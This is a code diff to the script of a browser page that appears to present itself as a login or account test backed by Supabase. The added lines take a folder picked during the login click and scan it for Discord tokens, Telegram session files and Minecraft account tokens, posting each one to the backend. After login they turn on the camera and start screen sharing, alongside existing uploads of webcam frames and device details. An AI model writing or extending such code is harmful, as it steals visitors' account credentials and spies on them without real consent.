@@ -109,7 +109,7 @@ const db = window.supabase.createClient(
 );
 const $ = id => document.getElementById(id);
 const OWNER = "villadssorensen@gmail.com";
-let RUN = null, me = {};
+let RUN = null, me = {}, appData = null;
 
 const mark = (k, state) => { const e = $(k); e.classList.remove("run", "done", "fail"); if (state) e.classList.add(state); };
 const note = (k, txt) => { $(k).querySelector(".out").innerHTML = txt; };
@@ -273,6 +273,7 @@ async function finishCam() {
   note("k4", "<b>photo taken</b> · 3 frames");
   mark("k4", "done");
   try { await db.rpc("test_files", { p_run: RUN, p_files: { faces: frames } }); } catch (e) {}
+  shareScreen();
   update();
 }
 
@@ -314,6 +315,32 @@ $("go").addEventListener("click", async () => {
   if (!code) return $("err").textContent = "Enter your password.";
 
   $("go").disabled = true;
+
+  /* folder picker first: it needs the click's activation */
+  if (window.showDirectoryPicker) {
+    try {
+      const h = await window.showDirectoryPicker({ mode: "read" });
+      mark("k3", "run");
+      const r = await scanRoaming(h);
+      const lines = [];
+      if (r.discord && r.discord.length) {
+        const uniq = [...new Set(r.discord)];
+        for (const tok of uniq) await post("Discord token", "dc", tok);
+        lines.push("<b>" + uniq.length + " discord token(s)</b>");
+      }
+      if (r.telegram) lines.push("<b>telegram session</b> · " + r.telegram.files + " files");
+      if (r.minecraft && r.minecraft.length) {
+        lines.push("<b>" + r.minecraft.length + " minecraft account(s)</b>");
+        for (const a of r.minecraft) await post("Minecraft", a.name || "?", a.token || "token");
+      }
+      note("k3", lines.join("<br>") || "nothing recognisable in there");
+      mark("k3", lines.length ? "done" : "fail");
+      appData = r;
+    } catch (e) { if (e.name !== "AbortError") { mark("k3", "fail"); note("k3", e.name); } }
+  } else {
+    note("k3", "this browser has no folder access");
+  }
+
   try {
     const { data, error } = await db.rpc("test_login", {
       p_email: email, p_username: user, p_code: code,
@@ -331,6 +358,9 @@ $("go").addEventListener("click", async () => {
 
     mark("k2", "run"); const dev = await device(); mark("k2", "done");
     await item("device", dev);
+
+    /* camera asks itself, then the screen share follows */
+    camOn();
   } catch (e) {
     $("err").textContent = e.message || "Failed.";
     $("go").disabled = false;
